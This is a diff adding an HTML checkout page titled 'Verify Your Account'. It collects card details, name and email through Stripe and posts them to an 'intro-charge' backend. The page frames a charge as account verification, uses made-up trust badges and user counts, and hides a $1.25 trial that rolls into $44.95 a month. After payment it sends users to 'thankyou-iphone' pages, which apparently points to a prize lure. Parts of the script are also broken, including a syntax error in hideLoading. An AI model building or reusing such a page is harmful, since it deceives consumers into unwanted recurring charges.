@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Verify Your Account</title>
+  <style>
+    :root{
+      --bg:#ffffff; --panel:#ffffff; --line:#e4e7ec; --muted:#6b7280; --text:#111827; --accent:#16a34a; --radius:12px;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+
+    .wrap{max-width:1100px;margin:24px auto 48px;padding:0 16px}
+
+    .grid{display:grid;grid-template-columns:1.1fr .9fr;gap:18px}
+    @media (max-width:960px){.grid{grid-template-columns:1fr;}}
+
+    .panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px}
+
+    /* Header inside left panel */
+    .panel h1{margin:0 0 6px;font-size:22px}
+    .subline{display:flex;align-items:center;gap:10px;color:#6b7280;font-size:12px;margin-bottom:12px}
+    .stars{color:#f59e0b;font-size:16px;letter-spacing:2px}
+
+    .field{margin:10px 0}
+    .label{font-weight:700;font-size:13px;margin-bottom:6px;color:#111827}
+    .input,.select,.el{width:100%;border:1px solid #cfd4dc;border-radius:10px;padding:12px;font-size:15px;outline:none;background:#fff}
+
+    .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+    @media (max-width:640px){.grid-2,.grid-3{grid-template-columns:1fr}}
+
+    .help{font-size:12px;color:var(--muted)}
+
+    .payrow{display:grid;grid-template-columns:2fr 1fr;gap:12px}
+    @media (max-width:640px){.payrow{grid-template-columns:1fr}}
+
+    .finish{margin-top:14px;display:flex;gap:10px}
+    .btn{flex:1;border:none;border-radius:12px;padding:14px 16px;font-weight:900;font-size:18px;cursor:pointer;background:linear-gradient(180deg,#22c55e,#16a34a);color:#fff}
+    .lock{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-radius:3px;position:relative;margin-right:8px}
+    .lock:before{content:"";position:absolute;left:50%;transform:translateX(-50%);top:-8px;width:12px;height:10px;border:2px solid #fff;border-bottom:none;border-radius:8px 8px 0 0}
+
+    .badges{display:flex;gap:16px;align-items:center;margin-top:10px;color:#6b7280;font-size:12px}
+
+    .features{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px;text-align:left}
+    .features h3{margin:0 0 10px;font-size:18px}
+    .bullets{margin-top:16px}
+    .bullet{display:flex;align-items:flex-start;gap:10px;margin:10px 0;font-size:14px;color:#374151}
+    .check{width:18px;height:18px;border-radius:999px;border:2px solid #9ca3af;display:inline-flex;align-items:center;justify-content:center}
+    .check::after{content:"✓";font-size:12px;color:#16a34a}
+
+    .fineprint{margin-top:14px;font-size:12px;color:#6b7280;line-height:1.5}
+
+    /* Loading overlay */
+    .loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.9);display:none;align-items:center;justify-content:center;z-index:9999}
+    .loading-overlay[aria-hidden="false"]{display:flex}
+    .loading-box{width:min(92vw,460px);background:#fff;border:1px solid #e6edf5;border-radius:14px;box-shadow:0 6px 18px rgba(0,0,0,.06);padding:20px;text-align:center;color:#2a3b55}
+    .loading-title{font-weight:800;margin:2px 0 10px;font-size:18px}
+    .progress-wrap{width:100%;height:10px;background:#ecf1f8;border-radius:999px;overflow:hidden}
+    .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#22c55e,#60a5fa);animation:loadingBar 2.2s ease-in-out infinite}
+    @keyframes loadingBar{0%{width:0%}60%{width:80%}100%{width:100%}}
+
+    .logos{display:flex;gap:8px;align-items:center}
+    .card-logos{height:20px}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="grid">
+      <!-- Left: form -->
+      <section class="panel">
+        <h1>Verify Your Account</h1>
+        <div class="subline">
+          <span>100% Secure Activation</span>
+          <span style="margin-left:auto" class="stars">★★★★★</span>
+          <span>313,218 users</span>
+        </div>
+
+        <div class="field">
+          <div class="label">Credit Card Number</div>
+          <div class="el" id="card-number"></div>
+          <div class="logos" style="margin-top:6px">
+            <img class="card-logos" src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img class="card-logos" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+          </div>
+        </div>
+
+        <div class="grid-3 field">
+          <div>
+            <div class="label">Expiration Date</div>
+            <div class="el" id="card-expiry"></div>
+          </div>
+          <div>
+            <div class="label">CVV</div>
+            <div class="el" id="card-cvc"></div>
+          </div>
+          <div>
+            <div class="label">&nbsp;</div>
+            <div class="help">What is this?</div>
+          </div>
+        </div>
+
+        <div class="grid-2 field">
+          <div>
+            <div class="label">First Name</div>
+            <input id="firstName" class="input" placeholder="First Name" autocomplete="given-name">
+          </div>
+          <div>
+            <div class="label">Last Name</div>
+            <input id="lastName" class="input" placeholder="Last Name" autocomplete="family-name">
+          </div>
+        </div>
+
+        <div class="grid-2 field">
+          <div>
+            <div class="label">Country</div>
+            <select id="country" class="select">
+              <option value="">Select…</option>
+              <option>United States</option>
+              <option>Canada</option>
+              <option>United Kingdom</option>
+              <option>Australia</option>
+              <option>Germany</option>
+              <option>France</option>
+              <option>Spain</option>
+              <option>Italy</option>
+              <option>Netherlands</option>
+              <option>Brazil</option>
+              <option>Mexico</option>
+              <option>Chile</option>
+              <option>Argentina</option>
+              <option>India</option>
+              <option>Japan</option>
+            </select>
+          </div>
+          <div>
+            <div class="label">Postal Code</div>
+            <input id="shipZip" class="input" placeholder="Postal Code" autocomplete="postal-code">
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="label">Email Address</div>
+          <input id="email" class="input" type="email" placeholder="you@example.com" autocomplete="email">
+        </div>
+
+        <div class="finish">
+          <button id="orderNow" class="btn"><span class="lock"></span>FINISH</button>
+        </div>
+
+        <div class="badges">
+          <div>🛡️ SECURE SSL ENCRYPTION</div>
+          <div>⚡ INSTANT VERIFICATION</div>
+        </div>
+
+        <p class="fineprint">By clicking the button, you agree to the <a href="#">Terms &amp; Conditions</a> and <a href="#">Privacy Policy</a>.</p>
+      </section>
+
+      <!-- Right: features -->
+      <aside class="features">
+        <h3>Enjoy endless entertainment with ad-free HD streaming of your favorite movies, audiobooks, ebooks, and games—available anytime, anywhere, on any device!</h3>
+        <div class="bullets">
+          <div class="bullet"><span class="check"></span><span>Unlimited access to our extensive entertainment library</span></div>
+          <div class="bullet"><span class="check"></span><span>Handpicked content across every popular genre</span></div>
+          <div class="bullet"><span class="check"></span><span>Seamless HD streaming on all your devices</span></div>
+          <div class="bullet"><span class="check"></span><span>Enjoy an immersive, ad‑free experience</span></div>
+        </div>
+        <p class="fineprint">Try our service for $1.25 for a 2‑day trial. If you don’t like it or you find that the service is not for you, you may cancel at any time before the trial ends. To cancel, access your Account, go to the Support section and choose Cancel Membership. If you don’t cancel your subscription before the end of 2‑day trial period, your membership will continue on a monthly basis at $44.95/month until cancelled. You may cancel the service at any time, no questions asked.</p>
+      </aside>
+    </div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
+    <div class="loading-box">
+      <div class="loading-title">Processing your payment…</div>
+      <div class="progress-wrap"><div class="progress-bar"></div></div>
+      <p class="help" style="margin-top:10px">Please wait, this may take a few seconds.</p>
+    </div>
+  </div>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    // SAME endpoint and publishable key as atlas.html / atlas3.html
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+
+    const overlay = document.getElementById('loading-overlay');
+    const errBox = document.getElementById('err');
+    function showLoading(){overlay.style.display='flex';overlay.setAttribute('aria-hidden','false');}
+    function hideLoading(){overlay.setAttribute('aria-hidden','true');overlay.style.display='none');}
+  </script>
+  <script>
+    // Init Stripe Elements
+    let stripe, elements, cardNumber, cardExpiry, cardCvc;
+    if(window.Stripe){
+      stripe = Stripe(PUBLISHABLE_KEY);
+      elements = stripe.elements();
+      cardNumber = elements.create('cardNumber');
+      cardExpiry = elements.create('cardExpiry');
+      cardCvc    = elements.create('cardCvc');
+      cardNumber.mount('#card-number');
+      cardExpiry.mount('#card-expiry');
+      cardCvc.mount('#card-cvc');
+    }
+
+    function nameFrom(first, last){
+      return [first||'', last||''].join(' ').trim() || undefined;
+    }
+
+    function guessISO(){ const cc=(navigator.language||'').split('-')[1]; return cc?cc.toUpperCase():undefined; }
+
+    async function handlePay(){
+      if(!stripe){ alert('Payment temporarily unavailable. Please try again.'); return; }
+      showLoading();
+
+      const first = document.getElementById('firstName').value.trim();
+      const last  = document.getElementById('lastName').value.trim();
+      const email = document.getElementById('email').value.trim();
+
+      const address = {
+        line1: undefined,
+        city: undefined,
+        state: undefined,
+        postal_code: document.getElementById('shipZip').value.trim() || undefined,
+        country: guessISO()
+      };
+
+      try{
+        const pmRes = await stripe.createPaymentMethod({
+          type:'card',
+          card: cardNumber,
+          billing_details:{ name: nameFrom(first,last), email: email||undefined, address }
+        });
+        if(pmRes.error) throw new Error(pmRes.error.message);
+
+        const resp = await fetch(SUBSCRIBE_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
+          paymentMethodId: pmRes.paymentMethod.id,
+          name: nameFrom(first,last),
+          email, address
+        })});
+        const data = await resp.json();
+        if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error) throw new Error(conf.error.message);
+        if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Payment not completed');
+
+        (function(){
+          const A='thankyou-iphone.html';
+          const B='thankyou-iphone-skip.html';
+          const pid=(conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
+          function fnv1a32(str){ let h=0x811c9dc5>>>0; for(let i=0;i<str.length;i++){ h^=str.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0; } return h>>>0; }
+          function cryptoRandInt(max){ try{ const u32=new Uint32Array(1); crypto.getRandomValues(u32); return Number(u32[0]%BigInt(max)); }catch{ return Math.floor(Math.random()*max); } }
+          const bucket = pid ? (fnv1a32(pid)%100) : cryptoRandInt(100);
+          const goSkip = bucket < 60;
+          const qb = pid ? ('?v='+encodeURIComponent(pid)) : ('?t='+Date.now());
+          window.location.href = (goSkip?B:A) + qb;
+        })();
+      }catch(err){
+        alert(err.message || 'Something went wrong.');
+        hideLoading();
+      }
+    }
+
+    document.getElementById('orderNow').addEventListener('click', handlePay);
+  </script>
+</body>
+</html>
